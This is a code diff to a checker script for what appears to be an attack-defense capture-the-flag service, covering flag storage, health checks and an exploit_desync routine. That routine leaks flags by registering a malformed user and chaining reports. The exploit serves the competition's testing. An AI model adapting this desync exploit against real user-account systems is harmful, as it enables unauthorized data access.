@@ -292,8 +292,8 @@ async def getnoise_community(task: GetnoiseCheckerTaskMessage, logger: LoggerAda
             assert_equals(output, f.output, "Query result is wrong (undefined)")
 
 
-@checker.havoc(2)
-async def havoc(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB,
+@checker.havoc(1)
+async def havoc_check_static_pages(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB,
                 di: DependencyInjector) -> None:
     await client.get('/')
     await client.get('/docs')
@@ -399,9 +399,8 @@ async def exploit_jit_rce(database: str, logger: LoggerAdapter, searcher: FlagSe
 @handle_invalid_response_exceptions
 # just register with flag as custom 
 # TODO: we can randomize the register a bit more, with randomly set salary, custom etc
-# TODO we should also randomize account type if possible
 async def putflag_profile(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
-                             db: ChainDB) -> str:
+                          db: ChainDB) -> str:
     client = JitterishClient(logger, httpclient)
 
     username = generate_username()
@@ -409,19 +408,18 @@ async def putflag_profile(task: PutflagCheckerTaskMessage, logger: LoggerAdapter
     num_reports = None
     looking_for_job = None
     current_salary = None
-    custom = task.flag 
-    fields = random.choices([True, False], k=4)
+    custom = task.flag
+    fields = random.choices([True, False], k=3)
     if fields[0]:
-        num_reports = random.randrange(0,100) 
+        num_reports = random.randrange(0, 100)
     if fields[1]:
-        looking_for_job = (random.randrange(0,2)==1)
+        looking_for_job = (random.randrange(0, 2) == 1)
     if fields[2]:
-        current_salary = random.randrange(0,1000000)
-    account_type = random.choice(['enterprise','community','private'])
+        current_salary = random.randrange(0, 1000000)
 
     await client.register_raw(username, password,
-                          generate_random_string(8, False), generate_random_string(8, False),
-                          account_type, custom, num_reports, looking_for_job, current_salary)
+                              generate_random_string(8, False), generate_random_string(8, False),
+                              'business', custom, num_reports, looking_for_job, current_salary)
     # task.flag
     # task.task_id flag id?
     await db.set("profile_account", (username, password, num_reports, looking_for_job, current_salary, custom))
@@ -433,10 +431,10 @@ async def putflag_profile(task: PutflagCheckerTaskMessage, logger: LoggerAdapter
 @checker.getflag(0)
 @handle_invalid_response_exceptions
 async def getflag_profile(task: GetflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
-                             db: ChainDB) -> None:
+                          db: ChainDB) -> None:
     try:
         username, password, num_reports, looking_for_job, current_salary, custom = await db.get("profile_account")
-        
+
     except KeyError:
         raise MumbleException("Database info missing")
 
@@ -455,17 +453,18 @@ async def register_raw_wrapper(client, db, req_num_reports=False, req_lfj=False,
     custom = None
     fields = random.choices([True, False], k=4)
     if fields[0] or req_num_reports:
-        num_reports = random.randrange(0,100) 
+        num_reports = random.randrange(0, 100)
     if fields[1] or req_lfj:
-        looking_for_job = (random.randrange(0,2)==1)
+        looking_for_job = (random.randrange(0, 2) == 1)
     if fields[2] or req_salary:
-        current_salary = random.randrange(0,1000000)
+        current_salary = random.randrange(0, 1000000)
     if fields[3] or req_custom:
         # TODO: this could be useful words/combinations
         custom = generate_username()
-    account_type = random.choice(['enterprise','community','business'])
+    account_type = random.choice(['enterprise', 'community', 'business'])
 
-    await client.register_raw(username, password, generate_random_string(8, False), generate_random_string(8, False), account_type, custom, num_reports, looking_for_job, current_salary)
+    await client.register_raw(username, password, generate_random_string(8, False), generate_random_string(8, False),
+                              account_type, custom, num_reports, looking_for_job, current_salary)
     # task.flag
     # task.task_id flag id?
     return (username, password, num_reports, looking_for_job, current_salary, custom)
@@ -473,20 +472,20 @@ async def register_raw_wrapper(client, db, req_num_reports=False, req_lfj=False,
 
 @checker.putnoise(0)
 async def putnoise_profile(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
-                             db: ChainDB) -> None:
+                           db: ChainDB) -> None:
     # TODO if a single client registers multiple times, is this fingerprintable?
     # check here that registering with a json status still works
     client = JitterishClient(logger, httpclient)
-    username, password, num_reports, looking_for_job, current_salary, custom = await register_raw_wrapper(client,db)
+    username, password, num_reports, looking_for_job, current_salary, custom = await register_raw_wrapper(client, db)
     await client.logout()
-    await db.set("profile_noise_account", (username, password, num_reports, looking_for_job, current_salary,custom ))
+    await db.set("profile_noise_account", (username, password, num_reports, looking_for_job, current_salary, custom))
 
     pass
 
 
 @checker.getnoise(0)
 async def getnoise_profile(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient, db: ChainDB,
-                             di: DependencyInjector) -> None:
+                           di: DependencyInjector) -> None:
     try:
         username, password, num_reports, looking_for_job, current_salary, custom = await db.get("profile_noise_account")
     except KeyError:
@@ -513,55 +512,60 @@ async def getnoise_profile(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapt
 
 
 @checker.havoc(0)
-async def havoc(task: HavocCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient, db: ChainDB,
+async def havoc_check_user_accounts(task: HavocCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient, db: ChainDB,
                 di: DependencyInjector) -> None:
-    # we need to test the num_reports increment in havoc, as the update does not persist after a logout
-
-    actual_num_reports = random.randint(1,5)
+    # we need to test the num_reports increment, as the update does not persist after a logout
+    actual_num_reports = random.randint(1, 3)
     victims = []
-    
 
     # register the victims
-    for _ in range(0,actual_num_reports):
+    for _ in range(0, actual_num_reports):
         client = JitterishClient(logger, httpclient)
-        target_username, _, _, _, _, _ = await register_raw_wrapper(client,db)
+        target_username, _, _, _, _, _ = await register_raw_wrapper(client, db)
         victims.append(target_username)
         await client.logout()
 
     # register the reporter
-    username, password, num_reports, looking_for_job, current_salary, custom = await register_raw_wrapper(client,db,req_num_reports=True)
+    client = JitterishClient(logger, httpclient)
+    username, password, num_reports, looking_for_job, current_salary, custom = await register_raw_wrapper(client, db,
+                                                                                                          req_num_reports=True)
     # report the victims
     for v in victims:
-        l = random.randint(4,16)
+        l = random.randint(4, 16)
         reason = generate_random_string(l, False)
         await client.report(v, reason)
     # after report, the profile num reports entry should match the number of reports we issued 
     response = await client.get('/session/profile')
     # the actual number of reports set during profile creation does not matter, the db counts the real reports
-    assert_in(str(actual_num_reports), response.text, f"Num_reports wrong, expected {actual_num_reports} to be in {response.text}")
+    assert_in(f'<strong>{actual_num_reports}</strong>', response.text,
+              f"Num_reports wrong, expected {actual_num_reports} to be in {response.text}")
     await client.logout()
     pass
+
 
 async def signup_broken(client):
     username = generate_username()
     password = generate_password()
-    data = {"username": username, "password": password, "firstname": "script", "lastname": "script","status":'{"num_reports":[]}', "accounttype": "business"}
-    res = await client.post('/session/register', data=data, follow_redirects=True)
+    data = {"username": username, "password": password, "firstname": "script", "lastname": "script",
+            "status": '{"num_reports":[]}', "accounttype": "business"}
+    await client.post('/session/register', data=data, follow_redirects=True)
     await client.logout()
     return username
+
 
 async def signup_useless(client):
     username = generate_username()
     password = generate_password()
     await client.register(username, password,
                           generate_random_string(8, False), generate_random_string(8, False),
-                          'enterprise')
+                          'business')
     await client.logout()
     return username
 
+
 @checker.exploit(0)
 async def exploit_desync(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher,
-                                       httpclient: AsyncClient) -> bytes | None:
+                         httpclient: AsyncClient) -> bytes | None:
     target_user = task.attack_info
     client = JitterishClient(logger, httpclient)
     # signup broken user
@@ -571,37 +575,18 @@ async def exploit_desync(task: ExploitCheckerTaskMessage, logger: LoggerAdapter,
     # signup the regular user
     username = generate_username()
     password = generate_password()
-    await client.register(username, password, generate_random_string(8, False), generate_random_string(8, False), 'enterprise')
+    logger.info(f'Exploiting user: {username!r} / {password!r}')
+    await client.register(username, password, generate_random_string(8, False), generate_random_string(8, False), 'business')
     reason = generate_username()
     # report padding user
     await client.report(useless, reason)
     # report broken user
     await client.report(broken, reason)
     # report gameserver 
-    logger.info(target_user)
+    logger.info(f'Exploiting target_user')
     await client.report(target_user, reason)
     res = await client.get('/session/profile')
     return searcher.search_flag(res.text)
-
-
-
-# def report(s, username):
-#     support_data = {"target_user": username, "description": get_random()}
-#     r = s.post("http://localhost:8000/support", data = support_data)
-#     return s
-# 
-# def get_profile(s):
-#     r = s.get("http://localhost:8000/session/profile")
-#     print(r.text)
-# 
-# # report padding user
-# s = report(s,useless)
-# # report broken user
-# s = report(s,broken)
-# # report gameserver
-# s = report(s,flag_id)
-# # visit profile
-# get_profile(s)
 
 
 if __name__ == "__main__":
